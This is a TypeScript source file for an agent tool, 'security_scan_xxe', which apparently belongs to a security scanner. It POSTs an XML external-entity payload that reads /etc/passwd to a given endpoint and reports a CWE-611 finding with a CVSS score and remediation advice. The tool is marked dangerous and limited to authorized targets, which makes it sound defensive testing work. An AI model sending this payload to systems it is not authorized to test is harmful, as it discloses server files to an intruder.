import { createHash } from "node:crypto";
import type { ToolDefinition } from "../../../core/types.js";
import { severityFromScore } from "./cvss.js";
import { formatScanOutput, type Finding, type ScanOutput } from "./types.js";

// Port of cyberlens's xxe.py, scoped to a single given endpoint rather
// than every discovered POST-capable endpoint (no crawler here). Unlike
// the GET-only injection scanners, this sends an unsolicited raw XML POST
// body to an endpoint that may not expect XML at all — the same real
// side-effect risk cyberlens's own --active-forms gate exists for, which
// is why this tool is riskLevel "dangerous" rather than "ask" like the
// GET-based ones.
const XXE_PAYLOAD = '<?xml version="1.0"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<root>&xxe;</root>';
const DISCLOSURE_MARKER = "root:x:0:0:";

async function scanXxe(endpoint: string): Promise<ScanOutput> {
  let response: Response;
  try {
    response = await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/xml" },
      body: XXE_PAYLOAD,
      signal: AbortSignal.timeout(10_000),
    });
  } catch (err) {
    throw new Error(`Could not reach ${endpoint}: ${err instanceof Error ? err.message : String(err)}`);
  }

  const body = await response.text();
  if (!body.includes(DISCLOSURE_MARKER)) {
    return { findings: [], passedControls: [{ label: "No XXE detected", detail: `Posted an XXE payload to ${endpoint}; the response did not reflect local file contents.` }] };
  }

  const score = 9.1;
  const digest = createHash("sha1").update(endpoint).digest("hex").slice(0, 10);
  const finding: Finding = {
    id: `xxe-confirmed-${digest}`,
    title: "XML External Entity (XXE) Injection",
    severity: severityFromScore(score),
    cvssVector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    cvssScore: score,
    cwe: "CWE-611",
    description: `POSTing an XML body with an external entity to ${endpoint} causes the server to read and return the contents of a local file (/etc/passwd).`,
    evidence: `POST ${endpoint} with an XXE payload -> response contains '${DISCLOSURE_MARKER}'.`,
    impact:
      "XXE can be used to read arbitrary local files, and in some configurations to perform server-side request forgery (SSRF) or achieve remote code execution via exposed XML parsers.",
    remediation: "Disable external entity resolution (DTD processing) in the XML parser — every major XML library has a documented way to do this. Prefer a safe/hardened parser configuration by default.",
    affectedEndpoint: endpoint,
  };

  return { findings: [finding], passedControls: [] };
}

interface SecurityScanXxeInput {
  endpoint: string;
}

export const securityScanXxeTool: ToolDefinition<SecurityScanXxeInput> = {
  name: "security_scan_xxe",
  description:
    "Security tool. POSTs a raw XML body containing an external entity (pointing at /etc/passwd) to an " +
    "endpoint and checks whether the response reflects local file contents — the classic XXE file-disclosure " +
    "signature. Sends a real, unsolicited POST request with a payload to an endpoint that may not expect XML " +
    "at all — a real side-effect risk (same reason cyberlens's own --active-forms flag gates this), not a " +
    "safe-by-default GET probe. A faithful port of the user's own cyberlens scanner's xxe check, scoped to one " +
    "endpoint at a time (no site crawler exists in this project to discover more). " +
    "IMPORTANT: only test an endpoint the user owns or has explicit, documented authorization to test.",
  riskLevel: "dangerous",
  inputSchema: {
    type: "object",
    properties: { endpoint: { type: "string", description: "URL to POST the XXE payload to" } },
    required: ["endpoint"],
  },
  describeCall: (input) => `POST XXE payload to: ${input.endpoint}`,
  async handler(input) {
    try {
      const output = await scanXxe(input.endpoint);
      return { content: formatScanOutput(input.endpoint, output), isError: false };
    } catch (err) {
      return { content: err instanceof Error ? err.message : String(err), isError: true };
    }
  },
};
